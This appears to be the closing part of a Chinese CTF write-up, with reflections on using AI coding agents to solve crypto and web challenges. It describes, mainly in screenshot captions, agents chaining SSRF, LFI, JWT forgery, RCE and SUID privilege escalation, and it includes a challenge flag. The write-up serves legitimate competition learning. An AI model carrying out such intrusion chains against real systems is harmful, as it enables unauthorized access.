# d bits = 3071
# flag = dart{379c9308-e9a8-45a1-bd55-45bbd822e86d}

```

## AI Agent 使用感想

此前最多使用的是 Copilot Pro，再之前经常使用 Web 端。从 Web 端到 Agent 已然令我惊艳，但又第一次在比赛中尝试使用 Codex 后，发现我仍然低估了技术的发展。这并不是说特指哪一家的 Agent，而是整个领域的极大进步。

crypto-RSA 题目是借助 Copilot Opus 4.6 完成的，Opus 4.6 对题目的理解非常精准到位，可以很快地分析出每一关的关键所在，并自动进行密钥比对和判定，然后给出了分步的解题代码。在 Jupyter NoteBook 交互中大胆质疑工具的可靠性并重新尝试。然而对一些冷门工具如 SageMath 的使用不是很熟悉，需要提示词引导通过 Jupyter 使用 SageMath 来完成解题。

Web-Auth 题目是第一次使用了 Codex GPT-5.4 xhigh 来完成，在整个过程中，我只负责了部分思路的纠正和引导，例如最开始的 SSRF&错误回显 漏洞是人工直接指出(当然我相信 Codex 有这个能力可以独立发现)。随后 Codex 独立尝试了 LFI 本地 /proc 下进程信息，探测到了 Redis 服务和 RPC 服务，

![Codex 拿 Redis 敏感文件并尝试 SSRF 渗透 Redis](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322133442251.png)

![Codex 发现新的服务并第一时间找到 RCE 关键](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322133611700.png)

![image-20260322133736280](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322133736280.png)

![Codex 跑偏了](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322134059415.png)

![受阻后总结并等待指示](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322134230647.png)

![取证到关键线索](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322134330070.png)

![通过 Secret Key 泄露伪造 JWT](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322134448474.png)![总结利用链并尝试 get flag](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322134825464.png)

整段 Agent 分析大约用了 3h，除去使用的第三方 API 的原因外，本身思考似乎也比较费时，但丰富全面的经验还是无可比拟的。

Web-thymeleaf 则是第二次尝试 Agent 渗透，

![源码审计中](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322135214514.png)

![PRNG 伪随机数漏洞直接秒了](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322135359086.png)

![Codex 成功 RCE 但死磕 400 的 /flag 不提权](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322140020984.png)

![在人工提醒下尝试 SUID 提权](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322140229072.png)

![立即提权成功](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/image-20260322140317338.png)

其中，RCE 的摸索是这题中 Agent 花费时间最多的地方，但如果人工审计的话可能也不会很快。Codex 胜出在自动化和智能化的分析和利用上。如果有正确的方向会很快地完成实现，如果没有具体的方向也会不断地尝试摸索。

总的来说，AI Agent 在安全方面的应用体验非常惊艳，令人印象深刻。虽然在某些细节上可能需要人工的引导和纠正，例如工具的提供、细节方向的修正等，但整体上它极大地提升了效率和成功率。

此次体验算是完全打破了我以往对学习认知的方法论的理解，之前我一直认为学习是一个人类主导的过程，AI 可以作为辅助工具来使用，但这次的体验让我意识到 AI Agent 已经具备了独立思考和解决问题的能力，人与 AI 的主要矛盾已经不再是人类主导还是 AI 主导的问题，而是如何更好地协同工作的问题。人不能只想着如何与 AI 进行竞争，而是应该思考如何与 AI 进行合作，发挥各自的优势来解决问题。人需要**认识到并承认**自己的局限性，承认 AI 无可比拟的进步速度，如此才能更好地利用 AI 来提升自己的能力，而不是陷入无谓的竞争中。

正好在 Re 群看到之前 「正规子群」师傅在去年就有提到过 CTF Agent 的开发和使用，我还是慢人许久才真正体验了一把。未来应当把重心放到如何更好利用 AI 上来，摒弃传统的学习方法论。



分享一则视频

[阳和平：AI挑战传统学习和教育，抗拒者将被无情淘汰](https://www.bilibili.com/video/av115574197787600)